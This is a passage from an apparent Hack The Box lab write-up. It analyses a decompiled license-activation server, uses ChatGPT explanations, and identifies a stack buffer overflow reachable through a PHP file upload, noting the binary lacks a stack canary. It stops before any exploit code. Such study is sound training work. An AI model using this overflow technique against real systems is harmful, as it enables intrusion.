</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#a6e22e>bind</span>(serverfd, (<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>struct</span> sockaddr <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>server, <span style=color:#ae81ff>0x10u</span>) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v7 <span style=color:#f92672>=</span> <span style=color:#a6e22e>__errno_location</span>();
</span></span><span style=display:flex><span>    v8 <span style=color:#f92672>=</span> <span style=color:#a6e22e>strerror</span>(<span style=color:#f92672>*</span>v7);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>error</span>(v8);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#a6e22e>listen</span>(serverfd, <span style=color:#ae81ff>100</span>) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v9 <span style=color:#f92672>=</span> <span style=color:#a6e22e>__errno_location</span>();
</span></span><span style=display:flex><span>    v10 <span style=color:#f92672>=</span> <span style=color:#a6e22e>strerror</span>(<span style=color:#f92672>*</span>v9);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>error</span>(v10);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;[+] listening ...&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span> ( <span style=color:#ae81ff>1</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> ( <span style=color:#ae81ff>1</span> )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      clientfd <span style=color:#f92672>=</span> <span style=color:#a6e22e>accept</span>(serverfd, (<span style=color:#66d9ef>struct</span> sockaddr <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>clientaddr, <span style=color:#f92672>&amp;</span>clientaddrlen);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( clientfd <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> )
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>fwrite</span>(<span style=color:#e6db74>&#34;Error: accepting client</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#ae81ff>1uLL</span>, <span style=color:#ae81ff>0x18uLL</span>, stderr);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>inet_ntop</span>(<span style=color:#ae81ff>2</span>, <span style=color:#f92672>&amp;</span>clientaddr.sin_addr, clientaddr_s, <span style=color:#ae81ff>0x10u</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] accepted client connection from %s:%d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, clientaddr_s, clientaddr.sin_port);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( <span style=color:#f92672>!</span><span style=color:#a6e22e>fork</span>() )
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>close</span>(serverfd);
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>activate_license</span>(clientfd);
</span></span><span style=display:flex><span>      <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>__sysv_signal</span>(<span style=color:#ae81ff>17</span>, (__sighandler_t)((<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>dword_0 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>));
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>close</span>(clientfd);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><ul><li>chatGPT Explanation: (Very accurate :P)</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-md data-lang=md><span style=display:flex><span>This code is a simple implementation of a server that listens for incoming client connections on a specified port, accepts them, and then passes the client connection to a function called <span style=color:#e6db74>`activate_license`</span>. The server uses the <span style=color:#e6db74>`inet_ntop`</span> and <span style=color:#e6db74>`fork`</span> functions to handle multiple client connections concurrently.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>`__cdecl`</span> and <span style=color:#e6db74>`__noreturn`</span> are calling conventions and function attributes. <span style=color:#e6db74>`__cdecl`</span> is the standard calling convention for C programs, which specifies the calling and return behavior of functions in the program. <span style=color:#e6db74>`__noreturn`</span> is a function attribute that indicates that the function does not return. In this case, the <span style=color:#e6db74>`main`</span> function is marked with both attributes, indicating that it is a standard C function that does not return.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>The <span style=color:#e6db74>`main`</span> function takes three arguments: <span style=color:#e6db74>`argc`</span>, <span style=color:#e6db74>`argv`</span>, and <span style=color:#e6db74>`envp`</span>. <span style=color:#e6db74>`argc`</span> is the number of arguments passed to the program, and <span style=color:#e6db74>`argv`</span> is an array of strings containing the actual arguments. <span style=color:#e6db74>`envp`</span> is an array of strings containing the environment variables of the program.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Inside the <span style=color:#e6db74>`main`</span> function, the code first checks if the number of arguments passed to the program (`argc`) is equal to 2. If not, it calls the <span style=color:#e6db74>`error`</span> function with the string &#34;specify port to bind to&#34;. This means that the program expects the user to specify a port number as an argument when running the program.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Next, the code uses <span style=color:#e6db74>`__isoc99_sscanf`</span> to parse the first argument (the port number) and store it in the <span style=color:#e6db74>`port`</span> variable. If an error occurs, the code gets the error code using <span style=color:#e6db74>`__errno_location`</span> and then calls the <span style=color:#e6db74>`error`</span> function with a string containing a description of the error.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>The code then prints a message indicating that the server is starting and listening on the specified port. It creates a <span style=color:#e6db74>`serverfd`</span> socket using the <span style=color:#e6db74>`socket`</span> function, and then uses the <span style=color:#e6db74>`bind`</span> and <span style=color:#e6db74>`listen`</span> functions to bind the socket to the specified port and listen for incoming connections.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Next, the code enters an infinite loop to continuously accept incoming client connections. For each incoming connection, the code calls the <span style=color:#e6db74>`accept`</span> function to accept the connection and store the client information in the <span style=color:#e6db74>`clientaddr`</span> structure. It then calls the <span style=color:#e6db74>`inet_ntop`</span> function to convert the client&#39;s IP address to a human-readable string and print it, along with the client&#39;s port number.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>The code then creates a child process using the <span style=color:#e6db74>`fork`</span> function to handle the client connection concurrently with other connections. In the child process, the code calls the <span style=color:#e6db74>`activate_license`</span> function with the client&#39;s socket file descriptor, <span style=color:#e6db74>`clientfd`</span>, and then exits. In the parent process, the code closes the client&#39;s socket file descriptor and continues to accept incoming connections.
</span></span></code></pre></div><ul><li><em>activate_license</em> function analysis:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#66d9ef>__fastcall</span> <span style=color:#a6e22e>activate_license</span>(<span style=color:#66d9ef>int</span> sockfd)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>v1; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v2; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>v3; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v4; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v5; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v6; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v7; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v8; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v9; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v10; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v11; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v12; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  sqlite3_stmt_0 <span style=color:#f92672>*</span>stmt; <span style=color:#75715e>// [rsp+18h] [rbp-218h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  sqlite3_0 <span style=color:#f92672>*</span>db; <span style=color:#75715e>// [rsp+20h] [rbp-210h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>uint32_t</span> msglen; <span style=color:#75715e>// [rsp+2Ch] [rbp-204h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> buffer[<span style=color:#ae81ff>512</span>]; <span style=color:#75715e>// [rsp+30h] [rbp-200h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#a6e22e>read</span>(sockfd, <span style=color:#f92672>&amp;</span>msglen, <span style=color:#ae81ff>4uLL</span>) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>__errno_location</span>();
</span></span><span style=display:flex><span>    v2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>strerror</span>(<span style=color:#f92672>*</span>v1);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>error</span>(v2);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  msglen <span style=color:#f92672>=</span> <span style=color:#a6e22e>ntohl</span>(msglen);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] reading %d bytes</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, msglen);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#a6e22e>read</span>(sockfd, buffer, msglen) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>__errno_location</span>();
</span></span><span style=display:flex><span>    v4 <span style=color:#f92672>=</span> <span style=color:#a6e22e>strerror</span>(<span style=color:#f92672>*</span>v3);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>error</span>(v4);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)<span style=color:#a6e22e>sqlite3_open</span>(<span style=color:#e6db74>&#34;license.sqlite&#34;</span>, <span style=color:#f92672>&amp;</span>db) )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v5 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#a6e22e>sqlite3_errmsg</span>(db);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>error</span>(v5);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>sqlite3_busy_timeout</span>(db, <span style=color:#ae81ff>2000LL</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)<span style=color:#a6e22e>sqlite3_exec</span>(
</span></span><span style=display:flex><span>                       db,
</span></span><span style=display:flex><span>                       <span style=color:#e6db74>&#34;CREATE TABLE IF NOT EXISTS license (   id INTEGER PRIMARY KEY AUTOINCREMENT,   license_key TEXT)&#34;</span>,
</span></span><span style=display:flex><span>                       <span style=color:#ae81ff>0LL</span>,
</span></span><span style=display:flex><span>                       <span style=color:#ae81ff>0LL</span>,
</span></span><span style=display:flex><span>                       <span style=color:#ae81ff>0LL</span>) )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v6 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#a6e22e>sqlite3_errmsg</span>(db);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>error</span>(v6);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)<span style=color:#a6e22e>sqlite3_prepare_v2</span>(db, <span style=color:#e6db74>&#34;INSERT INTO license (license_key) VALUES (?)&#34;</span>, <span style=color:#ae81ff>0xFFFFFFFFLL</span>, <span style=color:#f92672>&amp;</span>stmt, <span style=color:#ae81ff>0LL</span>) )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v7 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#a6e22e>sqlite3_errmsg</span>(db);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>error</span>(v7);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)<span style=color:#a6e22e>sqlite3_bind_text</span>(stmt, <span style=color:#ae81ff>1LL</span>, buffer, <span style=color:#ae81ff>512LL</span>, <span style=color:#ae81ff>0LL</span>) )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v8 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#a6e22e>sqlite3_errmsg</span>(db);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>error</span>(v8);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)<span style=color:#a6e22e>sqlite3_step</span>(stmt) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>101</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v9 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#a6e22e>sqlite3_errmsg</span>(db);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>error</span>(v9);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)<span style=color:#a6e22e>sqlite3_reset</span>(stmt) )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v10 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#a6e22e>sqlite3_errmsg</span>(db);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>error</span>(v10);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)<span style=color:#a6e22e>sqlite3_finalize</span>(stmt) )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v11 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#a6e22e>sqlite3_errmsg</span>(db);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>error</span>(v11);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)<span style=color:#a6e22e>sqlite3_close</span>(db) )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v12 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#a6e22e>sqlite3_errmsg</span>(db);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>error</span>(v12);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] activated license: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, buffer);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><ul><li>chatGPT Explanation: (Very accurate :P)<ul><li>When chatGPT talks, i don&rsquo;t have anything to add :) .</li></ul></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-md data-lang=md><span style=display:flex><span>The <span style=color:#e6db74>`activate_license`</span> function is a function that is called with a socket file descriptor, <span style=color:#e6db74>`sockfd`</span>, when a new client connection is accepted by the server. The function reads a message of a specified length from the client using the <span style=color:#e6db74>`read`</span> function, and then stores the message in a buffer. It then uses the <span style=color:#e6db74>`sqlite3`</span> library to create and open a SQLite database file called &#34;license.sqlite&#34; if it does not already exist, and creates a table called &#34;license&#34; in the database if it does not already exist.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>The function then prepares an SQL statement to insert the license key contained in the buffer into the &#34;license&#34; table, binds the license key to the statement, and then executes the statement. If any errors occur during these steps, the code calls the <span style=color:#e6db74>`error`</span> function with a description of the error.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Finally, the function prints a message indicating that the license has been activated, and then returns.
</span></span></code></pre></div><h4 id=stack-smashing-exploiting-buffer-overflow-vulnerability>Stack smashing: Exploiting buffer overflow vulnerability</h4><ul><li><strong>ChatGPT</strong> explanation for buffer overflow:</li></ul><p>A buffer overflow is a type of vulnerability that occurs when a program writes more data to a buffer than the buffer is allocated to hold. This can happen, for example, when a program uses a fixed-length buffer to store user input, but the user provides more input than the buffer can hold. When this occurs, the extra data can overwrite adjacent memory, potentially corrupting or overwriting important data structures used by the program. In some cases, this can allow an attacker to execute arbitrary code by providing carefully crafted input that overwrites the program&rsquo;s execution flow.</p><ul><li>Thanks chatGPT :*</li></ul><h5 id=the-vulnerability-root-cause-its-the-time-to-say-good-buy-to-chatgpt>The vulnerability root cause (it&rsquo;s the time to say good buy to chatGPT):</h5><ul><li>After reading this code snippet from <code>activate_license</code> function</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// code snippet - 1
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>....
</span></span><span style=display:flex><span> <span style=color:#66d9ef>if</span> ( <span style=color:#a6e22e>read</span>(sockfd, <span style=color:#f92672>&amp;</span>msglen, <span style=color:#ae81ff>4uLL</span>) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> )
</span></span><span style=display:flex><span>....
</span></span></code></pre></div><ul><li>After reciving a successful connection (the program listning at 127.0.0.1:1337), <code>activate_license</code> function read the message len (<code>msglen</code> variable) from the socket file descriptor (<code>sockfd</code>) (take user input and put it into a variable - INPUT-1)</li><li>Based on the <code>msglen</code> variable the following code snippet read into the buffer variable data receivaed from the socket file descriptor (<code>sockfd</code>) (another user input - INPUT-2)</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// code snippet - 2
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>.....
</span></span><span style=display:flex><span>  msglen <span style=color:#f92672>=</span> <span style=color:#a6e22e>ntohl</span>(msglen); <span style=color:#75715e>// The ntohl() function converts the unsigned integer netlong from network byte order to host byte order.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] reading %d bytes</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, msglen);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#a6e22e>read</span>(sockfd, buffer, msglen) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> )
</span></span><span style=display:flex><span>.....
</span></span></code></pre></div><ul><li><p>The problem here is that the function used to read the data from <code>sockfd</code> and put it into the <code>buffer</code> variable is insecure (<code>read</code> from c standard library) . There is no boundary validation and the buffer (<code>char buffer[512];</code>) size is limited to (512 x 1 byte (char size in C language) = 512 byte), the user can enter too much data and overflow the <code>buffer</code> variable.</p></li><li><p><code>read</code> function manual page:</p></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># man 2 read</span>
</span></span><span style=display:flex><span>READ<span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>                                              Linux Programmer<span style=color:#960050;background-color:#1e0010>&#39;</span>s Manual                                             READ<span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>NAME
</span></span><span style=display:flex><span>       read - read from a file descriptor
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>SYNOPSIS
</span></span><span style=display:flex><span>       <span style=color:#75715e>#include &lt;unistd.h&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>       ssize_t read<span style=color:#f92672>(</span>int fd, void *buf, size_t count<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>DESCRIPTION
</span></span><span style=display:flex><span>       read<span style=color:#f92672>()</span> attempts to read up to count bytes from file descriptor fd into the buffer starting at buf.
</span></span></code></pre></div><ul><li><p>ChatGPT opinion:
<img src=/images/Pasted-image-20221208165806.png alt="Image alt"></p></li><li><p>Actually the probem here is not with the read function itslef. It&rsquo;s with reading the message len from the user input and then attempt to read <code>msglen</code> from the user input into a limited size <code>buffer</code> variable.</p></li></ul><p><img src=/images/buffer-1.png alt="Image alt"></p><ul><li>So now if i enter the <code>msglen</code> as <code>520 bytes</code> the program will attempt to read 520 bytes from the <code>sockfd</code> into a 512 bytes <code>buffer</code> variable. Overflow!!!</li></ul><p><img src=/images/buffer-2.png alt="Image alt"></p><ul><li>The most important question how to communicate wirh a process litning at localhost?<ul><li>Do you miss me?</li></ul></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e># activate_license.php
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_FILES[<span style=color:#e6db74>&#39;licensefile&#39;</span>])) {
</span></span><span style=display:flex><span>    $license      <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>($_FILES[<span style=color:#e6db74>&#39;licensefile&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>]);
</span></span><span style=display:flex><span>    $license_size <span style=color:#f92672>=</span> $_FILES[<span style=color:#e6db74>&#39;licensefile&#39;</span>][<span style=color:#e6db74>&#39;size&#39;</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    $socket <span style=color:#f92672>=</span> <span style=color:#a6e22e>socket_create</span>(<span style=color:#a6e22e>AF_INET</span>, <span style=color:#a6e22e>SOCK_STREAM</span>, <span style=color:#a6e22e>SOL_TCP</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$socket) { <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;error socket_create()</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>; }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>socket_connect</span>($socket, <span style=color:#e6db74>&#39;127.0.0.1&#39;</span>, <span style=color:#ae81ff>1337</span>)) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;error socket_connect()&#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>socket_strerror</span>(<span style=color:#a6e22e>socket_last_error</span>()) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>socket_write</span>($socket, <span style=color:#a6e22e>pack</span>(<span style=color:#e6db74>&#34;N&#34;</span>, $license_size));
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>socket_write</span>($socket, $license);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>socket_shutdown</span>($socket);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>socket_close</span>($socket);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><ul><li>All what we need to do is to create a crafted licensefile and submit it via the file upload functionality.</li><li>The cradted file will exploit the vulnerability and give us access to the remote machine.</li><li><strong>Note</strong>:
I thinked about exploiting SQL injection vuln but the application prepare query fucntion which means that the program is safe against SQL injection vuln.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>if</span> ( (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)<span style=color:#a6e22e>sqlite3_prepare_v2</span>(db, <span style=color:#e6db74>&#34;INSERT INTO license (license_key) VALUES (?)&#34;</span>, <span style=color:#ae81ff>0xFFFFFFFFLL</span>, <span style=color:#f92672>&amp;</span>stmt, <span style=color:#ae81ff>0LL</span>) )
</span></span></code></pre></div><h4 id=debugging-and-binary-exploitaion>Debugging and Binary exploitaion:</h4><h5 id=checking-the-security-flags-applied-to-the-binary-file>Checking the security flags applied to the binary file:</h5><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ checksec --file activate_license
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/home/xh41/HTBMachines/Retired_Box/activate_licens&#39;</span>
</span></span><span style=display:flex><span>    Arch:     amd64-64-little
</span></span><span style=display:flex><span>    RELRO:    Full RELRO
</span></span><span style=display:flex><span>    Stack:    No canary found
</span></span><span style=display:flex><span>    NX:       NX enabled
</span></span><span style=display:flex><span>    PIE:      PIE enabled
</span></span></code></pre></div><ul><li>What is nx protection? (ChatGPT)</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-md data-lang=md><span style=display:flex><span>NX protection, also known as &#34;non-executable memory&#34;, is a security feature that prevents the execution of code from certain memory regions, such as the stack and the heap. This can help to protect against certain types of exploits, such as buffer overflows, that attempt to execute arbitrary code by writing it to these memory regions and then executing it.
</span></span><span style=display:flex><span>
